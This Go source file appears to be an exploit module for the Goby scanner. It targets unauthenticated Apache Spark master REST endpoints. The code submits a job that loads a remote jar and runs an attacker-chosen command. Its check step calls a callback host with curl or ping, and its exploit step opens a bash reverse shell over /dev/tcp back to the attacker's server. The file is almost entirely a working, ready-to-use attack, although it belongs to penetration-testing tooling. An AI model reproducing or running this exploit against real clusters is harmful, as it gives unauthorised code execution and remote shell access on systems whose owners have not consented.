package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Spark Master REST Port Unauthorized Access RCE",
    "Description": "Apache Spark is a cluster computing system that supports users to submit applications to management nodes and distribute them to the cluster for execution. If the management node does not enable ACL (Access Control), we will be able to execute arbitrary code in the cluster.",
    "Product": "Apache Spark",
    "Homepage": "https://spark.apache.org/",
    "DisclosureDate": "2018-08-02",
    "Author": "ovi3",
    "GobyQuery": "body=\"serverSparkVersion\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "https://github.com/vulhub/vulhub/tree/master/spark/unacc"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "goby_shell_linux"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "unauthorized",
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "Apache-Spark"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "10487"
}`

	uploadJar := func(u *httpclient.FixUrl, jarFileUrl string, cmd string) bool {
		uri := "/v1/submissions/create"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/json")
		cmd = strings.ReplaceAll(cmd, `\`, `\\`)
		cmd = strings.ReplaceAll(cmd, `"`, `\"`)
		cfg.Data = fmt.Sprintf(`{
  "action": "CreateSubmissionRequest",
  "clientSparkVersion": "2.1.1",
  "appArgs": [
    "%s"
  ],
  "appResource": "%s",
  "environmentVariables": {
    "SPARK_ENV_LOADED": "1"
  },
  "mainClass": "Exploit",
  "sparkProperties": {
    "spark.jars": "%s",
    "spark.driver.supervise": "false",
    "spark.app.name": "sparkspark",
    "spark.eventLog.enabled": "true",
    "spark.submit.deployMode": "cluster",
    "spark.master": "spark://%s"
  }
}`, cmd, jarFileUrl, jarFileUrl, u.HostInfo)

		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return regexp.MustCompile(`"success"\s*:\s*true`).MatchString(resp.RawBody)
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomHex := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(randomHex)
			jarFileUrl := godclient.GodServerAddr + "/ps/spark-warehouse" // 远程jar包， 来源：https://github.com/aRe00t/rce-over-spark/

			if isDomain {
				uploadJar(u, jarFileUrl, "curl "+checkUrl)
			} else {
				uploadJar(u, jarFileUrl, "ping -c 2 "+checkUrl)
			}

			return godclient.PullExists(randomHex, time.Second*10)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			waitSessionCh := make(chan string)
			if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
				log.Println("[WARNING] godclient bind failed", err)
			} else {
				jarFileUrl := godclient.GodServerAddr + "/ps/spark-warehouse" // 远程jar包
				cmd := fmt.Sprintf(`bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%s<&1`, godclient.GetGodServerHost(), rp)
				// fmt.Println(cmd)
				uploadJar(expResult.HostInfo, jarFileUrl, cmd)

				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						fmt.Println(webConsleID)
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 15):
				}
			}
			return expResult
		},
	))
}
